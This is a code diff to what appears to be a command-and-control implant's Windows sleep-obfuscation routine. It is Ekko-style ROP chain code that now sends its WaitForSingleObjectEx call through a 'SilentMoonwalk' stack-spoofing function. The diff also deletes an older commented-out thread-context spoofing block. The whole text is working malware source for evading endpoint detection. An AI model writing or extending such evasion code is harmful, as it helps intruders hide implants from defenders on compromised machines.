@@ -1,4 +1,5 @@
 #include "../../../../headers/agent/evasion/SleepObfu/EkkoSleepObf.h"
+#include "../../../../headers/agent/evasion/stackspoof/SilentMoonwalk.h"
 
 BOOL EkkoSleepObf(
 	_In_ DWORD TimeOut
@@ -100,13 +101,23 @@ BOOL EkkoSleepObf(
                         Rop[i].Rip = (UINT_PTR)JmpGadget; //set RIP to null for right now. More useful for when i have a JmpGadget.
                         Rop[i].Rsp -= sizeof(PVOID);
                     }
+                    Args args;
+                    args.Nargs = 3;
+                    args.Arg01 = (UINT_PTR)EvntStart;
+                    args.Arg02 = (UINT_PTR)INFINITE;
+                    args.Arg03 = (UINT_PTR)0; // FALSE.
 
-                    /* start rop chain with WaitForSingleObject. */
-                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
-                    Rop[Inc].Rcx = (UINT_PTR)EvntStart;
-                    Rop[Inc].Rdx = (UINT_PTR)INFINITE;
-                    Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
+
+                    Rop[Inc].Rip = (UINT_PTR)SilentMoonwalkMain;
+                    Rop[Inc].Rcx = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
+                    Rop[Inc].Rdx = (UINT_PTR)&args;
                     Inc++;
+                    /* start rop chain with WaitForSingleObject. */
+                    //Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
+                    //Rop[Inc].Rcx = (UINT_PTR)EvntStart;
+                    //Rop[Inc].Rdx = (UINT_PTR)INFINITE;
+                    //Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
+                    //Inc++;
 
                     /*Virtual protect*/
                     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)agent->ModuleBaseAddr;
@@ -130,32 +141,7 @@ BOOL EkkoSleepObf(
 
                     //TODO  stack spoof for rop chain
                                         /* perform stack spoofing */
-                    /*
-                    if (agent->config->StackSpoof) {
-                        Rop[Inc].Rip  = (UINT_PTR)agent->apis->pNtGetContextThread;
-                        Rop[Inc].Rcx = (UINT_PTR)ThdSrc;
-                        Rop[Inc].Rdx = (UINT_PTR)&ThdCtx;
-                        Inc++;
 
-                        Rop[Inc].Rip = (UINT_PTR)agent->apis->RtlCopyMappedMemory;
-                        Rop[Inc].Rcx = (UINT_PTR)&TimerCtx.Rip;
-                        Rop[Inc].Rdx = (UINT_PTR)&ThdCtx.Rip;
-                        Rop[Inc].R8 = (UINT_PTR)sizeof(LPVOID);
-                        Inc++;
-
-                        Rop[Inc].Rip = (UINT_PTR)agent->apis->RtlCopyMappedMemory;
-                        Rop[Inc].Rcx = (UINT_PTR)(&agent->pTeb->NtTib);
-                        Rop[Inc].Rdx = (UINT_PTR)(&NtTib);
-                        Rop[Inc].R8 = (UINT_PTR)(sizeof(NT_TIB));
-                        Inc++;
-
-                        Rop[Inc].Rip = (UINT_PTR)agent->apis->NtSetContextThread;
-                        Rop[Inc].Rcx = (UINT_PTR)(ThdSrc);
-                        Rop[Inc].Rdx = (UINT_PTR)(&TimerCtx);
-                        Inc++;
-                    }
-                    */
-                    /* Sleep */
                     Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
                     Rop[Inc].Rcx = (UINT_PTR)NtCurrentProcess();
                     Rop[Inc].Rdx = (UINT_PTR)(Delay + TimeOut);
